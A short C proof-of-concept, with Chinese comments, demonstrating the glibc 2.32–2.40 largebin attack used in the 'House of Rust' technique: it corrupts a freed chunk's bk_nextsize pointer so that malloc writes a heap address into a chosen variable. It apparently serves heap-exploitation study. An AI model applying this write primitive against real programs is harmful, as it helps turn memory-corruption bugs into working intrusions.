/*
 * House of Rust 使用的 post-2.30 largebin 写，适用于 glibc 2.32～2.40。
 *
 * 漏洞模型：可以修改已经进入 largebin 的 chunk->bk_nextsize。
 * 成功效果：把新插入 chunk 的头地址写入 target。
 */

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    size_t target = 0;

    /* p1 的物理大小为 0x430。 */
    size_t *p1 = malloc(0x428);

    /* fence 防止 p1 与后面的 p2 合并。 */
    malloc(0x18);

    /* p2 的物理大小为 0x420，比 p1 小 0x10，并与 p1 位于同一 largebin。 */
    size_t *p2 = malloc(0x418);

    /* fence 防止 p2 与 top chunk 合并。 */
    malloc(0x18);

    /* p1 先进入 unsorted bin。 */
    free(p1);

    /* 更大的申请使 p1 从 unsorted bin 转入 largebin。 */
    malloc(0x438);

    /* p2 留在 unsorted bin，稍后会作为更小节点插入 p1 所在 largebin。 */
    free(p2);

    /*
     * p1[3] 是 p1->bk_nextsize。
     * 插入 p2 时会向 bk_nextsize->fd_nextsize 写入 p2 的 chunk 头。
     * fd_nextsize 位于伪 chunk 头的 +0x20，所以这里使用 target-0x20。
     */
    p1[3] = (size_t)&target - 0x20;

    /* 再次扫描 unsorted bin，触发 p2 的 largebin 插入。 */
    malloc(0x438);

    assert(target == (size_t)(p2 - 2));
    printf("[+] largebin 写入目标\n");
    return 0;
}
